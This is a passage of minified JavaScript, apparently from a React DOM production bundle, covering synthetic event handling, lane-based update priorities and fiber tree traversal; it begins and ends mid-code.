t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var sl=null;function ql(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var al=null,Gt=null,Kt=null;function Gi(e){if(e=qn(e)){if(typeof al!="function")throw Error(y(280));var t=e.stateNode;t&&(t=so(t),al(e.stateNode,e.type,t))}}function Sa(e){Gt?Kt?Kt.push(e):Kt=[e]:Gt=e}function wa(){if(Gt){var e=Gt,t=Kt;if(Kt=Gt=null,Gi(e),t)for(e=0;e<t.length;e++)Gi(t[e])}}function ka(e,t){return e(t)}function Ca(){}var Po=!1;function xa(e,t,n){if(Po)return e(t,n);Po=!0;try{return ka(e,t,n)}finally{Po=!1,(Gt!==null||Kt!==null)&&(Ca(),wa())}}function In(e,t){var n=e.stateNode;if(n===null)return null;var r=so(n);if(r===null)return null;n=r[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(e=e.type,r=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!r;break e;default:e=!1}if(e)return null;if(n&&typeof n!="function")throw Error(y(231,t,typeof n));return n}var ul=!1;if(Je)try{var fn={};Object.defineProperty(fn,"passive",{get:function(){ul=!0}}),window.addEventListener("test",fn,fn),window.removeEventListener("test",fn,fn)}catch{ul=!1}function Bc(e,t,n,r,o,l,i,s,a){var c=Array.prototype.slice.call(arguments,3);try{t.apply(n,c)}catch(f){this.onError(f)}}var Tn=!1,Lr=null,Dr=!1,cl=null,Vc={onError:function(e){Tn=!0,Lr=e}};function bc(e,t,n,r,o,l,i,s,a){Tn=!1,Lr=null,Bc.apply(Vc,arguments)}function Jc(e,t,n,r,o,l,i,s,a){if(bc.apply(this,arguments),Tn){if(Tn){var c=Lr;Tn=!1,Lr=null}else throw Error(y(198));Dr||(Dr=!0,cl=c)}}function Lt(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,t.flags&4098&&(n=t.return),e=t.return;while(e)}return t.tag===3?n:null}function Ta(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Ki(e){if(Lt(e)!==e)throw Error(y(188))}function $c(e){var t=e.alternate;if(!t){if(t=Lt(e),t===null)throw Error(y(188));return t!==e?null:e}for(var n=e,r=t;;){var o=n.return;if(o===null)break;var l=o.alternate;if(l===null){if(r=o.return,r!==null){n=r;continue}break}if(o.child===l.child){for(l=o.child;l;){if(l===n)return Ki(o),e;if(l===r)return Ki(o),t;l=l.sibling}throw Error(y(188))}if(n.return!==r.return)n=o,r=l;else{for(var i=!1,s=o.child;s;){if(s===n){i=!0,n=o,r=l;break}if(s===r){i=!0,r=o,n=l;break}s=s.sibling}if(!i){for(s=l.child;s;){if(s===n){i=!0,n=l,r=o;break}if(s===r){i=!0,r=l,n=o;break}s=s.sibling}if(!i)throw Error(y(189))}}if(n.alternate!==r)throw Error(y(190))}if(n.tag!==3)throw Error(y(188));return n.stateNode.current===n?e:t}function Ea(e){return e=$c(e),e!==null?Pa(e):null}function Pa(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=Pa(e);if(t!==null)return t;e=e.sibling}return null}var ja=ye.unstable_scheduleCallback,Qi=ye.unstable_cancelCallback,Gc=ye.unstable_shouldYield,Kc=ye.unstable_requestPaint,J=ye.unstable_now,Qc=ye.unstable_getCurrentPriorityLevel,Zl=ye.unstable_ImmediatePriority,Ra=ye.unstable_UserBlockingPriority,Ir=ye.unstable_NormalPriority,Xc=ye.unstable_LowPriority,Na=ye.unstable_IdlePriority,ro=null,ze=null;function Yc(e){if(ze&&typeof ze.onCommitFiberRoot=="function")try{ze.onCommitFiberRoot(ro,e,void 0,(e.current.flags&128)===128)}catch{}}var Le=Math.clz32?Math.clz32:ed,qc=Math.log,Zc=Math.LN2;function ed(e){return e>>>=0,e===0?32:31-(qc(e)/Zc|0)|0}var ir=64,sr=4194304;function kn(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Ar(e,t){var n=e.pendingLanes;if(n===0)return 0;var r=0,o=e.suspendedLanes,l=e.pingedLanes,i=n&268435455;if(i!==0){var s=i&~o;s!==0?r=kn(s):(l&=i,l!==0&&(r=kn(l)))}else i=n&~o,i!==0?r=kn(i):l!==0&&(r=kn(l));if(r===0)return 0;if(t!==0&&t!==r&&!(t&o)&&(o=r&-r,l=t&-t,o>=l||o===16&&(l&4194240)!==0))return t;if(r&4&&(r|=n&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=r;0<t;)n=31-Le(t),o=1<<n,r|=e[n],t&=~o;return r}function td(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function nd(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,o=e.expirationTimes,l=e.pendingLanes;0<l;){var i=31-Le(l),s=1<<i,a=o[i];a===-1?(!(s&n)||s&r)&&(o[i]=td(s,t)):a<=t&&(e.expiredLanes|=s),l&=~s}}function dl(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function Ma(){var e=ir;return ir<<=1,!(ir&4194240)&&(ir=64),e}function jo(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function Xn(e,t,n){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-Le(t),e[t]=n}function rd(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<n;){var o=31-Le(n),l=1<<o;t[o]=0,r[o]=-1,e[o]=-1,n&=~l}}function ei(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-Le(n),o=1<<r;o&t|e[r]&t&&(e[r]|=t),n&=~o}}var D=0;function Oa(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var La,ti,Da,Ia,Aa,fl=!1,ar=[],ot=null,lt=null,it=null,An=new Map,_n=new Map,et=[],od="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Xi(e,t){switch(e){case"focusin":case"focusout":ot=null;break;case"dragenter":case"dragleave":lt=null;break;case"mouseover":case"mouseout":it=null;break;case"pointerover":case"pointerout":An.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":_n.delete(t.pointerId)}}function pn(e,t,n,r,o,l){return e===null||e.nativeEvent!==l?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:l,targetContainers:[o]},t!==null&&(t=qn(t),t!==null&&ti(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,o!==null&&t.indexOf(o)===-1&&t.push(o),e)}function ld(e,t,n,r,o){switch(t){case"focusin":return ot=pn(ot,e,t,n,r,o),!0;case"dragenter":return lt=pn(lt,e,t,n,r,o),!0;case"mouseover":return it=pn(it,e,t,n,r,o),!0;case"pointerover":var l=o.pointerId;return An.set(l,pn(An.get(l)||null,e,t,n,r,o)),!0;case"gotpointercapture":return l=o.pointerId,_n.set(l,pn(_n.get(l)||null,e,t,n,r,o)),!0}return!1}function _a(e){var t=kt(e.target);if(t!==null){var n=Lt(t);if(n!==null){if(t=n.tag,t===13){if(t=Ta(n),t!==null){e.blockedOn=t,Aa(e.priority,function(){Da(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function kr(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=pl(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(n===null){n=e.nativeEvent;var r=new n.constructor(n.type,n);sl=r,n.target.dispatchEvent(r),sl=null}else return t=qn(n),t!==null&&ti(t),e.blockedOn=n,!1;t.shift()}return!0}function Yi(e,t,n){kr(e)&&n.delete(t)}function id(){fl=!1,ot!==null&&kr(ot)&&(ot=null),lt!==null&&kr(lt)&&(lt=null),it!==null&&kr(it)&&(it=null),An.forEach(Yi),_n.forEach(Yi)}function mn(e,t){e.blockedOn===t&&(e.blockedOn=null,fl||(fl=!0,ye.unstable_scheduleCallback(ye.unstable_NormalPriority,id)))}function Fn(e){function t(o){return mn(o,e)}if(0<ar.length){mn(ar[0],e);for(var n=1;n<ar.length;n++){var r=ar[n];r.blockedOn===e&&(r.blockedOn=null)}}for(ot!==null&&mn(ot,e),lt!==null&&mn(lt,e),it!==null&&mn(it,e),An.forEach(t),_n.forEach(t),n=0;n<et.length;n++)r=et[n],r.blockedOn===e&&(r.blockedOn=null);for(;0<et.length&&(n=et[0],n.blockedOn===null);)_a(n),n.blockedOn===null&&et.shift()}var Qt=Qe.ReactCurrentBatchConfig,_r=!0;function sd(e,t,n,r){var o=D,l=Qt.transition;Qt.transition=null;try{D=1,ni(e,t,n,r)}finally{D=o,Qt.transition=l}}function ad(e,t,n,r){var o=D,l=Qt.transition;Qt.transition=null;try{D=4,ni(e,t,n,r)}finally{D=o,Qt.transition=l}}function ni(e,t,n,r){if(_r){var o=pl(e,t,n,r);if(o===null)Fo(e,t,r,Fr,n),Xi(e,r);else if(ld(o,e,t,n,r))r.stopPropagation();else if(Xi(e,r),t&4&&-1<od.indexOf(e)){for(;o!==null;){var l=qn(o);if(l!==null&&La(l),l=pl(e,t,n,r),l===null&&Fo(e,t,r,Fr,n),l===o)break;o=l}o!==null&&r.stopPropagation()}else Fo(e,t,r,null,n)}}var Fr=null;function pl(e,t,n,r){if(Fr=null,e=ql(r),e=kt(e),e!==null)if(t=Lt(e),t===null)e=null;else if(n=t.tag,n===13){if(e=Ta(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return Fr=e,null}function Fa(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Qc()){case Zl:return 1;case Ra:return 4;case Ir:case Xc:return 16;case Na:return 536870912;default:return 16}default:return 16}}var nt=null,ri=null,Cr=null;function za(){if(Cr)return Cr;var e,t=ri,n=t.length,r,o="value"in nt?nt.value:nt.textContent,l=o.length;for(e=0;e<n&&t[e]===o[e];e++);var i=n-e;for(r=1;r<=i&&t[n-r]===o[l-r];r++);return Cr=o.slice(e,1<r?1-r:void 0)}function xr(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function ur(){return!0}function qi(){return!1}function we(e){function t(n,r,o,l,i){this._reactName=n,this._targetInst=o,this.type=r,this.nativeEvent=l,this.target=i,this.currentTarget=null;for(var s in e)e.hasOwnProperty(s)&&(n=e[s],this[s]=n?n(l):l[s]);return this.isDefaultPrevented=(l.defaultPrevented!=null?l.defaultPrevented:l.returnValue===!1)?ur:qi,this.isPropagationStopped=qi,this}return W(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=ur)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=ur)},persist:function(){},isPersistent:ur}),t}var sn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},oi=we(sn),Yn=W({},sn,{view:0,detail:0}),ud=we(Yn),Ro,No,hn,oo=W({},Yn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:li,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==hn&&(hn&&e.type==="mousemove"?(Ro=e.screenX-hn.screenX,No=e.screenY-hn.screenY):No=Ro=0,hn=e),Ro)},movementY:function(e){return"movementY"in e?e.movementY:No}}),Zi=we(oo),cd=W({},oo,{dataTransfer:0}),dd=we(cd),fd=W({},Yn,{relatedTarget:0}),Mo=we(fd),pd=W({},sn,{animationName:0,elapsedTime:0,pseudoElement:0}),md=we(pd),hd=W({},sn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),gd=we(hd),vd=W({},sn,{data:0}),es=we(vd),yd={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Sd={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},wd={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function kd(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=wd[e])?!!t[e]:!1}function li(){return kd}var Cd=W({},Yn,{key:function(e){if(e.key){var t=yd[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=xr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?Sd[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:li,charCode:function(e){return e.type==="keypress"?xr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?xr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),xd=we(Cd),Td=W({},oo,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),ts=we(Td),Ed=W({},Yn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:li}),Pd=we(Ed),jd=W({},sn,{propertyName:0,elapsedTime:0,pseudoElement:0}),Rd=we(jd),Nd=W({},oo,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Md=we(Nd),Od=[9,13,27,32],ii=Je&&"CompositionEvent"in window,En=null;Je&&"documentMode"in document&&(En=document.documentMode);var Ld=Je&&"TextEvent"in window&&!En,Ha=Je&&(!ii||En&&8<En&&11>=En),ns=" ",rs=!1;function Ua(e,t){switch(e){case"keyup":return Od.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Wa(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var _t=!1;function Dd(e,t){switch(e){case"compositionend":return Wa(t);case"keypress":return t.which!==32?null:(rs=!0,ns);case"textInput":return e=t.data,e===ns&&rs?null:e;default:return null}}function Id(e,t){if(_t)return e==="compositionend"||!ii&&Ua(e,t)?(e=za(),Cr=ri=nt=null,_t=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Ha&&t.locale!=="ko"?null:t.data;default:return null}}var Ad={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function os(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Ad[e.type]:t==="textarea"}function Ba(e,t,n,r){Sa(r),t=zr(t,"onChange"),0<t.length&&(n=new oi("onChange","change",null,n,r),e.push({event:n,listeners:t}))}var Pn=null,zn=null;function _d(e){Za(e,0)}function lo(e){var t=Ht(e);if(fa(t))return e}function Fd(e,t){if(e==="change")return t}var Va=!1;if(Je){var Oo;if(Je){var Lo="oninput"in document;if(!Lo){var ls=document.createElement("div");ls.setAttribute("oninput","return;"),Lo=typeof ls.oninput=="function"}Oo=Lo}else Oo=!1;Va=Oo&&(!document.documentMode||9<document.documentMode)}function is(){Pn&&(Pn.detachEvent("onpropertychange",ba),zn=Pn=null)}function ba(e){if(e.propertyName==="value"&&lo(zn)){var t=[];Ba(t,zn,e,ql(e)),xa(_d,t)}}function zd(e,t,n){e==="focusin"?(is(),Pn=t,zn=n,Pn.attachEvent("onpropertychange",ba)):e==="focusout"&&is()}function Hd(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return lo(zn)}function Ud(e,t){if(e==="click")return lo(t)}function Wd(e,t){if(e==="input"||e==="change")return lo(t)}function Bd(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var Ie=typeof Object.is=="function"?Object.is:Bd;function Hn(e,t){if(Ie(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var o=n[r];if(!Qo.call(t,o)||!Ie(e[o],t[o]))return!1}return!0}function ss(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function as(e,t){var n=ss(e);e=0;for(var r;n;){if(n.nodeType===3){if(r=e+n.textContent.length,e<=t&&r>=t)return{node:n,offset:t-e};e=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=ss(n)}}function Ja(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?Ja(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function $a(){for(var e=window,t=Or();t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href=="string"}catch{n=!1}if(n)e=t.contentWindow;else break;t=Or(e.document)}return t}function si(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function Vd(e){var t=$a(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&Ja(n.ownerDocument.documentElement,n)){if(r!==null&&si(n)){if(t=r.start,e=r.end,e===void 0&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if(e=(t=n.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var o=n.textContent.length,l=Math.min(r.start,o);r=r.end===void 0?l:Math.min(r.end,o),!e.extend&&l>r&&(o=r,r=l,l=o),o=as(n,l);var i=as(n,r);o&&i&&(e.rangeCount!==1||e.anchorNode!==o.node||e.anchorOffset!==o.offset||e.focusNode!==i.node||e.focusOffset!==i.offset)&&(t=t.createRange(),t.setStart(o.node,o.offset),e.removeAllRanges(),l>r?(e.addRange(t),e.extend(i.node,i.offset)):(t.setEnd(i.node,i.offset),e.addRange(t)))}}for(t=[],e=n;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<t.length;n++)e=t[n],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var bd=Je&&"documentMode"in document&&11>=document.documentMode,Ft=null,ml=null,jn=null,hl=!1;function us(e,t,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;hl||Ft==null||Ft!==Or(r)||(r=Ft,"selectionStart"in r&&si(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),jn&&Hn(jn,r)||(jn=r,r=zr(ml,"onSelect"),0<r.length&&(t=new oi("onSelect","select",null,t,n),e.push({event:t,listeners:r}),t.target=Ft)))}function cr(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var zt={animationend:cr("Animation","AnimationEnd"),animationiteration:cr("Animation","AnimationIteration"),animationstart:cr("Animation","AnimationStart"),transitionend:cr("Transition","TransitionEnd")},Do={},Ga={};Je&&(Ga=document.createElement("div").style,"AnimationEvent"in window||(delete zt.animationend.animation,delete zt.animationiteration.animation,delete zt.animationstart.animation),"TransitionEvent"in window||delete zt.transitionend.transition);function io(e){if(Do[e])return Do[e];if(!zt[e])return e;var t=zt[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in Ga)return Do[e]=t[n];return e}var Ka=io("animationend"),Qa=io("animationiteration"),Xa=io("animationstart"),Ya=io("transitionend"),qa=new Map,cs="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function mt(e,t){qa.set(e,t),Ot(t,[e])}for(var Io=0;Io<cs.length;Io++){var Ao=cs[Io],Jd=Ao.toLowerCase(),$d=Ao[0].toUpperCase()+Ao.slice(1);mt(Jd,"on"+$d)}mt(Ka,"onAnimationEnd");mt(Qa,"onAnimationIteration");mt(Xa,"onAnimationStart");mt("dblclick","onDoubleClick");mt("focusin","onFocus");mt("focusout","onBlur");mt(Ya,"onTransitionEnd");qt("onMouseEnter",["mouseout","mouseover"]);qt("onMouseLeave",["mouseout","mouseover"]);qt("onPointerEnter",["pointerout","pointerover"]);qt("onPointerLeave",["pointerout","pointerover"]);Ot("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Ot("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Ot("onBeforeInput",["compositionend","keypress","textInput","paste"]);Ot("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Ot("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Ot("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Cn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Gd=new Set("cancel close invalid load scroll toggle".split(" ").concat(Cn));function ds(e,t,n){var r=e.type||"unknown-event";e.currentTarget=n,Jc(r,t,void 0,e),e.currentTarget=null}function Za(e,t){t=(t&4)!==0;for(var n=0;n<e.length;n++){var r=e[n],o=r.event;r=r.listeners;e:{var l=void 0;if(t)for(var i=r.length-1;0<=i;i--){var s=r[i],a=s.instance,c=s.currentTarget;if(s=s.listener,a!==l&&o.isPropagationStopped())break e;ds(o,s,c),l=a}else for(i=0;i<r.length;i++){if(s=r[i],a=s.instance,c=s.currentTarget,s=s.listener,a!==l&&o.isPropagationStopped())break e;ds(o,s,c),l=a}}}if(Dr)throw e=cl,Dr=!1,cl=null,e}function A(e,t){var n=t[wl];n===void 0&&(n=t[wl]=new Set);var r=e+"__bubble";n.has(r)||(eu(t,e,2,!1),n.add(r))}function _o(e,t,n){var r=0;t&&(r|=4),eu(n,e,r,t)}var dr="_reactListening"+Math.random().toString(36).slice(2);function Un(e){if(!e[dr]){e[dr]=!0,sa.forEach(function(n){n!=="selectionchange"&&(Gd.has(n)||_o(n,!1,e),_o(n,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[dr]||(t[dr]=!0,_o("selectionchange",!1,t))}}function eu(e,t,n,r){switch(Fa(t)){case 1:var o=sd;break;case 4:o=ad;break;default:o=ni}n=o.bind(null,t,n,e),o=void 0,!ul||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(o=!0),r?o!==void 0?e.addEventListener(t,n,{capture:!0,passive:o}):e.addEventListener(t,n,!0):o!==void 0?e.addEventListener(t,n,{passive:o}):e.addEventListener(t,n,!1)}function Fo(e,t,n,r,o){var l=r;if(!(t&1)&&!(t&2)&&r!==null)e:for(;;){if(r===null)return;var i=r.tag;if(i===3||i===4){var s=r.stateNode.containerInfo;if(s===o||s.nodeType===8&&s.parentNode===o)break;if(i===4)for(i=r.return;i!==null;){var a=i.tag;if((a===3||a===4)&&(a=i.stateNode.containerInfo,a===o||a.nodeType===8&&a.parentNode===o))return;i=i.return}for(;s!==null;){if(i=kt(s),i===null)return;if(a=i.tag,a===5||a===6){r=l=i;continue e}s=s.parentNode}}r=r.return}xa(function(){var c=l,f=ql(n),m=[];e:{var h=qa.get(e);if(h!==void 0){var S=oi,w=e;switch(e){case"keypress":if(xr(n)===0)break e;case"keydown":case"keyup":S=xd;break;case"focusin":w="focus",S=Mo;break;case"focusout":w="blur",S=Mo;break;case"beforeblur":case"afterblur":S=Mo;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":S=Zi;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":S=dd;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":S=Pd;break;case Ka:case Qa:case Xa:S=md;break;case Ya:S=Rd;break;case"scroll":S=ud;break;case"wheel":S=Md;break;case"copy":case"cut":case"paste":S=gd;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":S=ts}var k=(t&4)!==0,F=!k&&e==="scroll",d=k?h!==null?h+"Capture":null:h;k=[];for(var u=c,p;u!==null;){p=u;var v=p.stateNode;if(p.tag===5&&v!==null&&(p=v,d!==null&&(v=In(u,d),v!=null&&k.push(Wn(u,v,p)))),F)break;u=u.return}0<k.length&&(h=new S(h,w,null,n,f),m.push({event:h,listeners:k}))}}if(!(t&7)){e:{if(h=e==="mouseover"||e==="pointerover",S=e==="mouseout"||e==="pointerout",h&&n!==sl&&(w=n.relatedTarget||n.fromElement)&&(kt(w)||w[$e]))break e;if((S||h)&&(h=f.window===f?f:(h=f.ownerDocument)?h.defaultView||h.parentWindow:window,S?(w=n.relatedTarget||n.toElement,S=c,w=w?kt(w):null,w!==null&&(F=Lt(w),w!==F||w.tag!==5&&w.tag!==6)&&(w=null)):(S=null,w=c),S!==w)){if(k=Zi,v="onMouseLeave",d="onMouseEnter",u="mouse",(e==="pointerout"||e==="pointerover")&&(k=ts,v="onPointerLeave",d="onPointerEnter",u="pointer"),F=S==null?h:Ht(S),p=w==null?h:Ht(w),h=new k(v,u+"leave",S,n,f),h.target=F,h.relatedTarget=p,v=null,kt(f)===c&&(k=new 